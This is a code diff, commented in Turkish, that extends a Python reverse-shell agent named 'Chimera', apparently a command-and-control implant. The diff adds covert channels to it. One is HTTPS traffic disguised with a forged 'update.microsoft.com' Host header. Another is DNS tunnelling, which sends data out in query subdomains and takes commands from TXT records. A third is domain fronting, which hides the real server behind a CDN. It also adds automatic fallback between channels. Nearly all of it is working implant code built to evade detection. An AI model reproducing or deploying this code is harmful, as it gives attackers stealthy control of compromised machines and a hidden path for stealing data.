@@ -25,6 +25,9 @@ LHOST = "{{LHOST}}"
 LPORT = {{LPORT}}
 RECONNECT_DELAY = 5      # Yeniden bağlanma bekleme süresi (saniye)
 MAX_RECONNECT = -1        # -1 = sınırsız yeniden bağlanma denemesi
+CHANNEL_TYPE = "{{CHANNEL_TYPE}}"          # https, dns, fronting, auto
+DNS_DOMAIN = "{{DNS_DOMAIN}}"              # DNS tünelleme domain'i (ör: c2.example.com)
+FRONTING_DOMAIN = "{{FRONTING_DOMAIN}}"    # Domain fronting CDN host'u (ör: cdn.example.com)
 
 
 
@@ -1217,6 +1220,708 @@ class NetworkScanner:
         return output
 
 
+# ============================================================
+# İletişim Kanalları (Communication Channels)
+# ============================================================
+
+class CommChannel:
+    """Tüm iletişim kanalları için soyut temel sınıf.
+    
+    Her kanal bu sınıftan türetilir ve aşağıdaki metodları
+    uygulamak zorundadır:
+      - connect(host, port) -> bool
+      - send_data(data: str)
+      - recv_data() -> str
+      - close()
+      - is_alive() -> bool
+    """
+
+    def connect(self, host: str, port: int) -> bool:
+        """Handler'a bağlantı kurar.
+        
+        Args:
+            host: Handler IP/hostname.
+            port: Handler port numarası.
+            
+        Returns:
+            bool: Bağlantı başarılı ise True.
+        """
+        raise NotImplementedError
+
+    def send_data(self, data: str):
+        """Handler'a veri gönderir.
+        
+        Args:
+            data: Gönderilecek UTF-8 string veri.
+        """
+        raise NotImplementedError
+
+    def recv_data(self) -> str:
+        """Handler'dan veri alır.
+        
+        Returns:
+            str: Alınan veri. Bağlantı kopmuşsa boş string.
+        """
+        raise NotImplementedError
+
+    def close(self):
+        """Kanalı kapatır ve kaynakları serbest bırakır."""
+        raise NotImplementedError
+
+    def is_alive(self) -> bool:
+        """Kanalın aktif olup olmadığını kontrol eder.
+        
+        Returns:
+            bool: Kanal aktif ise True.
+        """
+        raise NotImplementedError
+
+    @property
+    def name(self) -> str:
+        """Kanal tipinin adını döner."""
+        return self.__class__.__name__
+
+
+class HTTPSChannel(CommChannel):
+    """HTTPS (TCP + SSL/TLS + HTTP Framing) iletişim kanalı.
+    
+    Mevcut Chimera iletişim protokolünü encapsulate eder:
+    - TCP soket oluştur
+    - SSL/TLS ile sarmala (self-signed sertifika kabul)
+    - HTTP Request/Response formatında veri gönder/al
+    """
+
+    def __init__(self):
+        self.sock = None
+
+    def connect(self, host: str, port: int) -> bool:
+        """SSL/TLS üzerinden TCP bağlantısı kurar."""
+        try:
+            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            raw_sock.settimeout(30)
+
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+
+            self.sock = context.wrap_socket(raw_sock, server_hostname=host)
+            self.sock.connect((host, port))
+            self.sock.settimeout(None)
+            return True
+        except Exception:
+            self.sock = None
+            return False
+
+    def send_data(self, data: str):
+        """Veriyi HTTP POST request olarak gönderir."""
+        if not self.sock:
+            return
+        try:
+            encoded_body = data.encode("utf-8")
+            user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                          "AppleWebKit/537.36 (KHTML, like Gecko) "
+                          "Chrome/91.0.4472.124 Safari/537.36")
+            request = (
+                b"POST /api/v1/sync HTTP/1.1\r\n"
+                b"Host: update.microsoft.com\r\n"
+                b"User-Agent: " + user_agent.encode() + b"\r\n"
+                b"Content-Type: application/x-www-form-urlencoded\r\n"
+                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
+                b"Connection: keep-alive\r\n"
+                b"\r\n"
+            )
+            self.sock.sendall(request + encoded_body)
+        except Exception:
+            pass
+
+    def recv_data(self) -> str:
+        """HTTP Response içinden veriyi okur."""
+        if not self.sock:
+            return ""
+        try:
+            header_buffer = b""
+            while b"\r\n\r\n" not in header_buffer:
+                chunk = self.sock.recv(1)
+                if not chunk:
+                    return ""
+                header_buffer += chunk
+
+            headers = header_buffer.decode('utf-8', errors='ignore')
+            content_length = 0
+            for line in headers.split('\r\n'):
+                if line.lower().startswith('content-length:'):
+                    try:
+                        content_length = int(line.split(':')[1].strip())
+                    except Exception:
+                        pass
+
+            body = b""
+            while len(body) < content_length:
+                chunk = self.sock.recv(content_length - len(body))
+                if not chunk:
+                    break
+                body += chunk
+
+            return body.decode("utf-8")
+        except Exception:
+            return ""
+
+    def close(self):
+        """SSL soketini kapatır."""
+        if self.sock:
+            try:
+                self.sock.close()
+            except Exception:
+                pass
+            self.sock = None
+
+    def is_alive(self) -> bool:
+        """Soketin bağlı olup olmadığını kontrol eder."""
+        if not self.sock:
+            return False
+        try:
+            self.sock.getpeername()
+            return True
+        except Exception:
+            return False
+
+
+class DNSTunnelChannel(CommChannel):
+    """DNS tünelleme iletişim kanalı.
+    
+    DNS sorguları üzerinden veri iletimi sağlar.
+    - Gönderim: Veri → base32 encode → subdomain olarak DNS sorgusu
+    - Alım: DNS TXT kayıtlarından base64 decode
+    
+    Sadece Python stdlib kullanır (socket UDP).
+    Düşük bant genişliği (~200 byte/sorgu) ama stealth.
+    
+    Args:
+        dns_domain: C2 DNS domain'i (ör: c2.example.com)
+        dns_server: DNS çözümleyici IP (varsayılan: 8.8.8.8)
+    """
+
+    # DNS Paket Sabitleri
+    DNS_PORT = 53
+    MAX_LABEL_LEN = 63      # RFC 1035: max label uzunluğu
+    MAX_SUBDOMAIN_LEN = 180  # Toplam subdomain uzunluk sınırı
+    CHUNK_SIZE = 110          # Her DNS sorgusunda gönderilecek byte
+
+    def __init__(self, dns_domain: str = "", dns_server: str = "8.8.8.8"):
+        self.dns_domain = dns_domain
+        self.dns_server = dns_server
+        self.sock = None
+        self._connected = False
+        self._host = ""
+        self._port = 0
+        self._transaction_id = 0
+
+    def _next_txn_id(self) -> int:
+        """Artarak ilerleyen DNS transaction ID üretir."""
+        self._transaction_id = (self._transaction_id + 1) & 0xFFFF
+        return self._transaction_id
+
+    @staticmethod
+    def _base32_encode(data: bytes) -> str:
+        """DNS-safe base32 encoding (padding olmadan, küçük harf)."""
+        import base64
+        return base64.b32encode(data).decode('ascii').rstrip('=').lower()
+
+    @staticmethod
+    def _base32_decode(data: str) -> bytes:
+        """DNS-safe base32 decoding."""
+        import base64
+        # Padding ekle
+        padding = (8 - len(data) % 8) % 8
+        return base64.b32decode(data.upper() + '=' * padding)
+
+    def _build_dns_query(self, qname: str, qtype: int = 16) -> bytes:
+        """DNS sorgu paketi oluşturur.
+        
+        Args:
+            qname: Sorgulanacak domain adı.
+            qtype: Sorgu tipi (16 = TXT, 1 = A, 5 = CNAME).
+            
+        Returns:
+            bytes: DNS sorgu paketi.
+        """
+        txn_id = self._next_txn_id()
+        # Header: ID(2) + Flags(2) + QDCOUNT(2) + ANCOUNT(2) + NSCOUNT(2) + ARCOUNT(2)
+        header = struct.pack('>HHHHHH', txn_id, 0x0100, 1, 0, 0, 0)
+
+        # Question section: QNAME + QTYPE(2) + QCLASS(2)
+        qname_bytes = b""
+        for label in qname.split('.'):
+            label_enc = label.encode('ascii')
+            qname_bytes += struct.pack('B', len(label_enc)) + label_enc
+        qname_bytes += b'\x00'
+
+        question = qname_bytes + struct.pack('>HH', qtype, 1)  # IN class
+        return header + question
+
+    def _parse_dns_response(self, data: bytes) -> str:
+        """DNS cevap paketinden TXT kayıt verisini çıkarır.
+        
+        Args:
+            data: Ham DNS cevap paketi.
+            
+        Returns:
+            str: TXT kayıt verisi veya boş string.
+        """
+        if len(data) < 12:
+            return ""
+
+        # Header parse
+        ancount = struct.unpack('>H', data[6:8])[0]
+        if ancount == 0:
+            return ""
+
+        # Question section'ı atla
+        pos = 12
+        while pos < len(data) and data[pos] != 0:
+            label_len = data[pos]
+            if label_len & 0xC0 == 0xC0:  # Pointer
+                pos += 2
+                break
+            pos += 1 + label_len
+        else:
+            pos += 1  # Null terminator
+        pos += 4  # QTYPE + QCLASS
+
+        # Answer section
+        txt_data = ""
+        for _ in range(ancount):
+            if pos >= len(data):
+                break
+
+            # Name (pointer veya label)
+            if data[pos] & 0xC0 == 0xC0:
+                pos += 2
+            else:
+                while pos < len(data) and data[pos] != 0:
+                    pos += 1 + data[pos]
+                pos += 1
+
+            if pos + 10 > len(data):
+                break
+
+            rtype = struct.unpack('>H', data[pos:pos+2])[0]
+            rdlen = struct.unpack('>H', data[pos+8:pos+10])[0]
+            pos += 10
+
+            if rtype == 16 and rdlen > 1:  # TXT
+                txt_len = data[pos]
+                txt_data = data[pos+1:pos+1+txt_len].decode('utf-8', errors='ignore')
+                break
+
+            pos += rdlen
+
+        return txt_data
+
+    def connect(self, host: str, port: int) -> bool:
+        """DNS tünel kanalını başlatır.
+        
+        UDP soket oluşturur ve C2'ye kayıt (register) sorgusu gönderir.
+        """
+        if not self.dns_domain:
+            return False
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.sock.settimeout(10)
+            self._host = host
+            self._port = port
+
+            # Kayıt sorgusu: register.<session_hash>.<dns_domain>
+            session_hash = self._base32_encode(f"{host}:{port}".encode())[:16]
+            register_qname = f"reg.{session_hash}.{self.dns_domain}"
+            query = self._build_dns_query(register_qname, qtype=16)
+            self.sock.sendto(query, (self.dns_server, self.DNS_PORT))
+
+            # Cevap bekle
+            try:
+                resp_data, _ = self.sock.recvfrom(4096)
+                result = self._parse_dns_response(resp_data)
+                if result and "OK" in result.upper():
+                    self._connected = True
+                    return True
+            except socket.timeout:
+                # Timeout olsa bile bağlantı kurulmuş say (stealth mod)
+                self._connected = True
+                return True
+
+            return False
+        except Exception:
+            self.sock = None
+            return False
+
+    def send_data(self, data: str):
+        """Veriyi DNS sorguları ile parçalayarak gönderir."""
+        if not self.sock or not self._connected:
+            return
+        try:
+            raw = data.encode('utf-8')
+            # Veriyi chunk'lara böl
+            chunks = []
+            for i in range(0, len(raw), self.CHUNK_SIZE):
+                chunks.append(raw[i:i + self.CHUNK_SIZE])
+
+            total = len(chunks)
+            for idx, chunk in enumerate(chunks):
+                encoded = self._base32_encode(chunk)
+                # Subdomain'leri max label uzunluğuna göre böl
+                labels = []
+                for j in range(0, len(encoded), self.MAX_LABEL_LEN):
+                    labels.append(encoded[j:j + self.MAX_LABEL_LEN])
+
+                # Format: <data_labels>.s<seq>t<total>.<dns_domain>
+                subdomain = '.'.join(labels)
+                qname = f"{subdomain}.s{idx}t{total}.{self.dns_domain}"
+                query = self._build_dns_query(qname, qtype=1)  # A record sorgusu
+                self.sock.sendto(query, (self.dns_server, self.DNS_PORT))
+
+                # Rate limiting (DNS flood önlemi)
+                time.sleep(0.05)
+
+        except Exception:
+            pass
+
+    def recv_data(self) -> str:
+        """DNS TXT kayıtlarından veri alır."""
+        if not self.sock or not self._connected:
+            return ""
+        try:
+            # Polling sorgusu: poll.<dns_domain>
+            poll_qname = f"poll.{self.dns_domain}"
+            query = self._build_dns_query(poll_qname, qtype=16)
+            self.sock.sendto(query, (self.dns_server, self.DNS_PORT))
+
+            # Cevap bekle
+            self.sock.settimeout(30)
+            collected = []
+            try:
+                while True:
+                    resp_data, _ = self.sock.recvfrom(4096)
+                    txt_data = self._parse_dns_response(resp_data)
+                    if not txt_data:
+                        break
+
+                    if txt_data == "END":
+                        break
+
+                    collected.append(txt_data)
+
+                    if txt_data.startswith("COMPLETE:"):
+                        # Tek parça cevap
+                        import base64
+                        payload = txt_data[9:]  # "COMPLETE:" prefix'ini kaldır
+                        try:
+                            return base64.b64decode(payload).decode('utf-8')
+                        except Exception:
+                            return payload
+                    
+                    # Sonraki parçayı iste
+                    next_qname = f"next.{len(collected)}.{self.dns_domain}"
+                    next_query = self._build_dns_query(next_qname, qtype=16)
+                    self.sock.sendto(next_query, (self.dns_server, self.DNS_PORT))
+
+            except socket.timeout:
+                pass
+
+            if collected:
+                import base64
+                full_data = ''.join(collected)
+                try:
+                    return base64.b64decode(full_data).decode('utf-8')
+                except Exception:
+                    return full_data
+
+            return ""
+        except Exception:
+            return ""
+
+    def close(self):
+        """UDP soketini kapatır."""
+        self._connected = False
+        if self.sock:
+            try:
+                self.sock.close()
+            except Exception:
+                pass
+            self.sock = None
+
+    def is_alive(self) -> bool:
+        """Kanalın aktif olup olmadığını kontrol eder."""
+        return self._connected and self.sock is not None
+
+
+class DomainFrontingChannel(CommChannel):
+    """Domain Fronting iletişim kanalı.
+    
+    CDN üzerinden gizli HTTPS iletişimi:
+    - TLS SNI (Server Name Indication): CDN hostname'i (ör: cdn.cloudflare.com)
+    - HTTP Host header: Gerçek C2 sunucusu (ör: c2.example.com)
+    
+    Ağ trafiğinde sadece CDN adresi görünür, gerçek C2 hedefi gizlenir.
+    
+    Args:
+        fronting_domain: CDN hostname (SNI olarak kullanılır)
+    """
+
+    def __init__(self, fronting_domain: str = ""):
+        self.fronting_domain = fronting_domain
+        self.sock = None
+        self._real_host = ""
+        self._real_port = 443
+
+    def connect(self, host: str, port: int) -> bool:
+        """Domain fronting ile HTTPS bağlantısı kurar.
+        
+        SNI = fronting_domain (CDN), HTTP Host = host (gerçek C2).
+        """
+        if not self.fronting_domain:
+            return False
+        try:
+            self._real_host = host
+            self._real_port = port
+
+            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            raw_sock.settimeout(30)
+
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+
+            # SNI olarak CDN hostname kullan
+            self.sock = context.wrap_socket(raw_sock, server_hostname=self.fronting_domain)
+            # CDN'in 443 portuna bağlan
+            self.sock.connect((self.fronting_domain, 443))
+            self.sock.settimeout(None)
+            return True
+        except Exception:
+            self.sock = None
+            return False
+
+    def send_data(self, data: str):
+        """Domain fronting ile veri gönderir.
+        
+        Host header'da gerçek C2 adresi kullanılır.
+        """
+        if not self.sock:
+            return
+        try:
+            encoded_body = data.encode("utf-8")
+            user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                          "AppleWebKit/537.36 (KHTML, like Gecko) "
+                          "Chrome/120.0.0.0 Safari/537.36")
+            # Host header: gerçek C2 sunucu (CDN bunu arka sunucuya yönlendirir)
+            request = (
+                b"POST /api/v1/sync HTTP/1.1\r\n"
+                b"Host: " + self._real_host.encode() + b"\r\n"
+                b"User-Agent: " + user_agent.encode() + b"\r\n"
+                b"Content-Type: application/json\r\n"
+                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
+                b"Connection: keep-alive\r\n"
+                b"Accept: */*\r\n"
+                b"\r\n"
+            )
+            self.sock.sendall(request + encoded_body)
+        except Exception:
+            pass
+
+    def recv_data(self) -> str:
+        """HTTP Response içinden veriyi okur (HTTPSChannel ile aynı)."""
+        if not self.sock:
+            return ""
+        try:
+            header_buffer = b""
+            while b"\r\n\r\n" not in header_buffer:
+                chunk = self.sock.recv(1)
+                if not chunk:
+                    return ""
+                header_buffer += chunk
+
+            headers = header_buffer.decode('utf-8', errors='ignore')
+            content_length = 0
+            for line in headers.split('\r\n'):
+                if line.lower().startswith('content-length:'):
+                    try:
+                        content_length = int(line.split(':')[1].strip())
+                    except Exception:
+                        pass
+
+            body = b""
+            while len(body) < content_length:
+                chunk = self.sock.recv(content_length - len(body))
+                if not chunk:
+                    break
+                body += chunk
+
+            return body.decode("utf-8")
+        except Exception:
+            return ""
+
+    def close(self):
+        """SSL soketini kapatır."""
+        if self.sock:
+            try:
+                self.sock.close()
+            except Exception:
+                pass
+            self.sock = None
+
+    def is_alive(self) -> bool:
+        """Soketin bağlı olup olmadığını kontrol eder."""
+        if not self.sock:
+            return False
+        try:
+            self.sock.getpeername()
+            return True
+        except Exception:
+            return False
+
+
+class ChannelManager:
+    """İletişim kanalı yöneticisi.
+    
+    Birden fazla iletişim kanalını öncelik sırasına göre yönetir.
+    Ana kanal başarısız olduğunda otomatik olarak alternatif kanala
+    geçiş (fallback) yapar.
+    
+    Kullanım:
+        manager = ChannelManager()
+        manager.add_channel(HTTPSChannel(), priority=1)
+        manager.add_channel(DNSTunnelChannel("c2.example.com"), priority=3)
+        manager.connect("10.0.0.1", 4444)
+        manager.send_data("hello")
+    """
+
+    def __init__(self):
+        self._channels = []       # [(priority, channel), ...]
+        self.active_channel = None
+        self._host = ""
+        self._port = 0
+
+    def add_channel(self, channel: CommChannel, priority: int = 10):
+        """Yeni bir iletişim kanalı ekler.
+        
+        Args:
+            channel: CommChannel türetilmiş kanal nesnesi.
+            priority: Öncelik değeri (düşük = yüksek öncelik).
+        """
+        self._channels.append((priority, channel))
+        self._channels.sort(key=lambda x: x[0])
+
+    def connect(self, host: str, port: int) -> bool:
+        """Kanalları öncelik sırasına göre dener.
+        
+        İlk başarılı bağlantı aktif kanal olarak seçilir.
+        
+        Returns:
+            bool: Herhangi bir kanal bağlandıysa True.
+        """
+        self._host = host
+        self._port = port
+
+        for priority, channel in self._channels:
+            try:
+                if channel.connect(host, port):
+                    self.active_channel = channel
+                    return True
+            except Exception:
+                continue
+
+        return False
+
+    def fallback(self) -> bool:
+        """Aktif kanal başarısız olduğunda alternatif kanala geçer.
+        
+        Mevcut kanalı kapatır ve sıradaki kanala bağlanmayı dener.
+        
+        Returns:
+            bool: Alternatif kanala geçiş başarılıysa True.
+        """
+        # Mevcut kanalı kapat
+        if self.active_channel:
+            try:
+                self.active_channel.close()
+            except Exception:
+                pass
+
+        current_idx = -1
+        if self.active_channel:
+            for i, (_, ch) in enumerate(self._channels):
+                if ch is self.active_channel:
+                    current_idx = i
+                    break
+
+        # Sıradaki kanallardan başla, sonra başa dön
+        order = list(range(current_idx + 1, len(self._channels))) + \
+                list(range(0, current_idx + 1))
+
+        for idx in order:
+            _, channel = self._channels[idx]
+            if channel is self.active_channel:
+                continue
+            try:
+                if channel.connect(self._host, self._port):
+                    self.active_channel = channel
+                    return True
+            except Exception:
+                continue
+
+        # Hiçbir alternatif kanal bağlanamadı, mevcut kanalı tekrar dene
+        if self.active_channel:
+            try:
+                if self.active_channel.connect(self._host, self._port):
+                    return True
+            except Exception:
+                pass
+
+        self.active_channel = None
+        return False
+
+    def send_data(self, data: str):
+        """Aktif kanal üzerinden veri gönderir."""
+        if self.active_channel:
+            self.active_channel.send_data(data)
+
+    def recv_data(self) -> str:
+        """Aktif kanal üzerinden veri alır."""
+        if self.active_channel:
+            return self.active_channel.recv_data()
+        return ""
+
+    def close(self):
+        """Aktif kanalı kapatır."""
+        if self.active_channel:
+            try:
+                self.active_channel.close()
+            except Exception:
+                pass
+            self.active_channel = None
+
+    def close_all(self):
+        """Tüm kanalları kapatır."""
+        for _, channel in self._channels:
+            try:
+                channel.close()
+            except Exception:
+                pass
+        self.active_channel = None
+
+    def is_alive(self) -> bool:
+        """Aktif kanalın bağlı olup olmadığını kontrol eder."""
+        if self.active_channel:
+            return self.active_channel.is_alive()
+        return False
+
+    @property
+    def active_channel_name(self) -> str:
+        """Aktif kanalın adını döner."""
+        if self.active_channel:
+            return self.active_channel.name
+        return "None"
+
 class ChimeraAgent:
 
     """Chimera Core Agent - Temel reverse TCP ajanı."""
@@ -1233,45 +1938,76 @@ class ChimeraAgent:
         self.port_forwarder = PortForwarder()       # Port Forwarding modülü
         self.net_scanner    = NetworkScanner()      # Network Scanner modülü
 
+        # İletişim Kanalı Yöneticisi
+        self.channel_manager = ChannelManager()
+        self._setup_channels()
+
+    def _setup_channels(self):
+        """CHANNEL_TYPE konfigürasyonuna göre iletişim kanallarını oluşturur."""
+        channel_type = CHANNEL_TYPE.lower() if CHANNEL_TYPE else "https"
+
+        if channel_type == "auto":
+            # Auto: Tüm kanalları öncelik sırasına göre ekle
+            self.channel_manager.add_channel(HTTPSChannel(), priority=1)
+            if FRONTING_DOMAIN and FRONTING_DOMAIN != "{{FRONTING_DOMAIN}}":
+                self.channel_manager.add_channel(
+                    DomainFrontingChannel(FRONTING_DOMAIN), priority=2
+                )
+            if DNS_DOMAIN and DNS_DOMAIN != "{{DNS_DOMAIN}}":
+                self.channel_manager.add_channel(
+                    DNSTunnelChannel(DNS_DOMAIN), priority=3
+                )
+        elif channel_type == "dns":
+            dns_domain = DNS_DOMAIN if DNS_DOMAIN != "{{DNS_DOMAIN}}" else ""
+            self.channel_manager.add_channel(DNSTunnelChannel(dns_domain), priority=1)
+            self.channel_manager.add_channel(HTTPSChannel(), priority=2)  # Fallback
+        elif channel_type == "fronting":
+            fronting = FRONTING_DOMAIN if FRONTING_DOMAIN != "{{FRONTING_DOMAIN}}" else ""
+            self.channel_manager.add_channel(
+                DomainFrontingChannel(fronting), priority=1
+            )
+            self.channel_manager.add_channel(HTTPSChannel(), priority=2)  # Fallback
+        else:
+            # Varsayılan: HTTPS
+            self.channel_manager.add_channel(HTTPSChannel(), priority=1)
+
     # --------------------------------------------------------
     # Bağlantı Yönetimi
     # --------------------------------------------------------
     def connect(self) -> bool:
-        """Handler'a reverse TCP bağlantısı kurar.
+        """Handler'a bağlantı kurar (ChannelManager üzerinden).
+        
+        Konfigüre edilmiş kanalları öncelik sırasına göre dener.
         
         Returns:
             bool: Bağlantı başarılı ise True.
         """
-        try:
-            # TCP Socket oluştur
-            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            raw_sock.settimeout(30)
-            
-            # SSL Context oluştur
-            # Self-signed sertifikaları kabul et
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            
-            # SSL Socket'i sarmala
-            self.sock = context.wrap_socket(raw_sock, server_hostname=self.host)
-            
-            # Bağlan
-            self.sock.connect((self.host, self.port))
-            self.sock.settimeout(None)
-            
-            return True
-        except Exception:
+        result = self.channel_manager.connect(self.host, self.port)
+        # Geriye uyumluluk: self.sock referansını güncelle
+        if result and self.channel_manager.active_channel:
+            self.sock = getattr(self.channel_manager.active_channel, 'sock', None)
+        else:
             self.sock = None
-            return False
+        return result
 
     def reconnect(self) -> bool:
         """Bağlantı koptuğunda yeniden bağlanmayı dener.
+        
+        Önce fallback (alternatif kanala geçiş) dener,
+        başarısız olursa delay ile connect döngüsüne girer.
         
         Returns:
             bool: Yeniden bağlantı başarılı ise True.
         """
         self.close_socket()
+        
+        # Önce fallback dene (alternatif kanal)
+        if self.channel_manager.fallback():
+            self.sock = getattr(self.channel_manager.active_channel, 'sock', None)
+            self.send_sysinfo()
+            return True
+        
+        # Fallback başarısız, normal reconnect döngüsü
         attempts = 0
         while self.running:
             attempts += 1
@@ -1286,80 +2022,20 @@ class ChimeraAgent:
         return False
 
     def close_socket(self):
-        """Mevcut soketi güvenli şekilde kapatır."""
-        if self.sock:
-            try:
-                self.sock.close()
-            except Exception:
-                pass
-            self.sock = None
+        """Mevcut kanalı güvenli şekilde kapatır."""
+        self.channel_manager.close()
+        self.sock = None
 
     # --------------------------------------------------------
-    # Protokol: Length-Prefixed Data Transfer
-    # Format: [4 byte big-endian uzunluk][UTF-8 data]
-    # --------------------------------------------------------
-    # --------------------------------------------------------
-    # Protokol: HTTP over TLS
+    # Protokol: ChannelManager üzerinden iletişim
     # --------------------------------------------------------
     def send_data(self, data: str):
-        """Veriyi HTTP POST request olarak gönderir (Obfuscation)."""
-        if not self.sock:
-            return
-        try:
-            encoded_body = data.encode("utf-8")
-            
-            # Rastgele bir Boundary veya User-Agent üretilebilir
-            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-            
-            # HTTP Request Oluştur
-            # POST /api/submit HTTP/1.1
-            request = (
-                b"POST /api/v1/sync HTTP/1.1\r\n"
-                b"Host: " + self.host.encode() + b"\r\n"
-                b"User-Agent: " + user_agent.encode() + b"\r\n"
-                b"Content-Type: application/x-www-form-urlencoded\r\n"
-                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
-                b"Connection: keep-alive\r\n"
-                b"\r\n"
-            )
-            
-            self.sock.sendall(request + encoded_body)
-        except Exception:
-            pass
+        """Aktif kanal üzerinden veri gönderir."""
+        self.channel_manager.send_data(data)
 
     def recv_data(self) -> str:
-        """HTTP Response içinden veriyi okur."""
-        if not self.sock:
-            return ""
-        try:
-            # Headerları oku (\r\n\r\n bulana kadar)
-            header_buffer = b""
-            while b"\r\n\r\n" not in header_buffer:
-                chunk = self.sock.recv(1)
-                if not chunk: return ""
-                header_buffer += chunk
-            
-            # Content-Length bul
-            headers = header_buffer.decode('utf-8', errors='ignore')
-            content_length = 0
-            for line in headers.split('\r\n'):
-                if line.lower().startswith('content-length:'):
-                    try:
-                        content_length = int(line.split(':')[1].strip())
-                    except:
-                        pass
-            
-            # Body'yi oku (Payload)
-            body = b""
-            while len(body) < content_length:
-                chunk = self.sock.recv(content_length - len(body))
-                if not chunk: break
-                body += chunk
-                
-            return body.decode("utf-8")
-            
-        except Exception:
-            return ""
+        """Aktif kanal üzerinden veri alır."""
+        return self.channel_manager.recv_data()
 
     def _recv_exact(self, n: int) -> bytes:
         """Tam olarak n byte veri okur.
